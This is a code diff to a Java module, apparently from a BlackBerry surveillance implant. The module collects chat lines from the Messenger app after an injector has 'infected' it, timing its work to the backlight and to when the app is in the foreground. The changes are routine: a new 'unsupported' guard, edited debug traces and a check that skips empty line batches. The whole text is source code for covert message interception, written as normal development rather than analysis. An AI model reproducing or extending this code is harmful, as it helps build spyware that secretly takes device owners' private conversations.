@@ -24,7 +24,7 @@ import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.manager.ModuleManager;
 import blackberry.module.im.LineMarkup;
-import blackberry.utils.Check;
+import blackberry.debug.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -46,6 +46,7 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
     String appName = "Messenger";
 
     LineMarkup markup;
+    private boolean unsupported;
 
     public static String getStaticType() {
         return "chat";
@@ -84,18 +85,18 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
 
     private synchronized String unserialize(String partecipants) {
         //#ifdef DEBUG
-        debug.trace("unserialize");
+        debug.trace("unserialize: "+partecipants);
         //#endif
 
         if (markup.isMarkup()) {
             String lastLine = markup.getLine(partecipants);
 
             //#ifdef DEBUG
-            debug.trace("unserialize: " + lastLine);
+            debug.trace("unserialized: " + lastLine);
             //#endif
             return lastLine;
-
         }
+        
         return null;
     }
 
@@ -103,6 +104,10 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
         //#ifdef DEBUG
         debug.trace("actualStart");
         //#endif
+
+        if (unsupported) {
+            return;
+        }
 
         AppListener.getInstance().addBacklightObserver(this);
         AppListener.getInstance().addApplicationObserver(this);
@@ -130,6 +135,10 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
     }
 
     public void actualGo() {
+
+        if (unsupported) {
+            return;
+        }
 
         if (appInjector.isInfected() && Backlight.isEnabled()
                 && isAppForeground) {
@@ -207,6 +216,13 @@ public final class ModuleChat extends BaseModule implements BacklightObserver,
         //#ifdef DEBUG
         debug.trace("add : " + partecipants + " lines: " + lines.size());
         //#endif
+        
+        if(lines.size()==0){
+            //#ifdef DEBUG
+            debug.trace("add: no lines, skipping");
+            //#endif
+            return;
+        }
 
         //#ifdef DBC
         Check.asserts(lines != null, "null lines");
